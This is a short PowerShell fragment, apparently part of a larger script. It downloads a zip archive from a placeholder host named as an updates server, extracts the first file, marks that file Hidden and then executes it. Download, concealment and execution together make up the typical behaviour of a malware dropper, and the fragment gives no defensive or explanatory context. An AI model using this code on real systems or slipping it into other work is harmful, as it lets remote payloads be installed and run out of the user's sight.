$url = 'https://updates.example.invalid/package.zip'
Invoke-WebRequest -Uri $url -OutFile $archive
$zip = [System.IO.Compression.ZipFile]::OpenRead($archive)
[System.IO.Compression.ZipFileExtensions]::ExtractToFile($zip.Entries[0], $output)
(Get-Item $output).Attributes = 'Hidden'
Start-Process -FilePath $output
